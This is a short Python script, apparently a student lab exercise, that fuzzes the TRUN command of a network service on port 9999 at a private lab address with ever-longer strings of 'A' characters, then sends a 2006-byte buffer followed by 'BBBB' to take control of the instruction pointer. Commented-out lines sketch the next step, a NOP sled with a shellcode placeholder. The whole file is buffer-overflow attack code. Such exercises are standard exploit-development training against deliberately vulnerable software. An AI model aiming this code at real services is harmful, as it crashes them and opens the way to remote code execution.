#!/usr/bin/env python
#CHRIS SEQUEIRA CAS8903

import socket

#prints output for each iteration may be more than 2-3 000 character
for i in range (1000,3000):
	ip = "172.16.237.128"
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip, 9999))
	s.recv(2048)

	badstr = "A"*i
	print(i)
	command = "TRUN ."+badstr
	s.send(command.encode())
	print(s.recv(2048))
	s.close()

#manual
#make client socket
ip = "172.16.237.128"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(5)
s.connect((ip, 9999))
s.recv(2048)

badstr = "A"*2006
command = "TRUN ."+badstr+"BBBB"
s.send(command.encode())
s.close()

#eip = "BBBB"    #replaces next address with "42424242"
#buf = "C"*20    #replaes shell code, if we find CCCC add more As
#badstr = "TRUN ." + "A"*i + eip + "\x90"*20 + buf + "\r\n"
#socket.connect((ip, 9999))
#socket.recv(2048)
#socket.send(badstr)
#socket.close()

